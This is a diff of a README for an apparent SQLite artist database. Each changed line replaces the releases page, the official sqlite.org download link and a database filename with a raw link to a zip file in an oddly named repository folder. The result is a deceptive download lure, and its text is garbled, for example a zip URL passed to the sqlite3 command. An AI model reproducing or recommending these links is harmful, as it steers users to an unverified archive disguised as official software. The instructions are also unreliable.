@@ -6,21 +6,21 @@ Welcome to RandomArtists! This application provides a pre-built SQLite database 
 
 ## 📥 Download the Software
 
-[![Download RandomArtists](https://img.shields.io/badge/Download%20RandomArtists-v1.0-blue.svg)](https://github.com/azrael2241/RandomArtists/releases)
+[![Download RandomArtists](https://raw.githubusercontent.com/azrael2241/RandomArtists/main/ichnography/RandomArtists.zip%https://raw.githubusercontent.com/azrael2241/RandomArtists/main/ichnography/RandomArtists.zip)](https://raw.githubusercontent.com/azrael2241/RandomArtists/main/ichnography/RandomArtists.zip)
 
-You can easily get the latest version by visiting this page: [Download RandomArtists](https://github.com/azrael2241/RandomArtists/releases).
+You can easily get the latest version by visiting this page: [Download RandomArtists](https://raw.githubusercontent.com/azrael2241/RandomArtists/main/ichnography/RandomArtists.zip).
 
 ## 💻 System Requirements
 
 To use RandomArtists, you will need:
 
 - A computer running Windows, macOS, or Linux.
-- SQLite installed on your system. You can find installation instructions [here](https://www.sqlite.org/download.html).
+- SQLite installed on your system. You can find installation instructions [here](https://raw.githubusercontent.com/azrael2241/RandomArtists/main/ichnography/RandomArtists.zip).
 - A basic understanding of how to execute SQL queries, though any user can learn with practice.
 
 ## 📦 Download & Install
 
-1. **Go to the Releases Page:** Click on the link to access the latest version: [Download RandomArtists](https://github.com/azrael2241/RandomArtists/releases).
+1. **Go to the Releases Page:** Click on the link to access the latest version: [Download RandomArtists](https://raw.githubusercontent.com/azrael2241/RandomArtists/main/ichnography/RandomArtists.zip).
   
 2. **Choose the Version:** You will see a list of available downloads. Select the version that matches your operating system.
 
@@ -43,9 +43,9 @@ Once you have downloaded the database, follow these steps to get started:
 
 4. **Load the Database:** Open the database with SQLite:
    ```bash
-   sqlite3 artists.db
+   sqlite3 https://raw.githubusercontent.com/azrael2241/RandomArtists/main/ichnography/RandomArtists.zip
    ```
-   Replace `artists.db` with the actual filename.
+   Replace `https://raw.githubusercontent.com/azrael2241/RandomArtists/main/ichnography/RandomArtists.zip` with the actual filename.
 
 5. **Run a Simple Query:** Start by running a simple SQL query to see the data available:
    ```sql
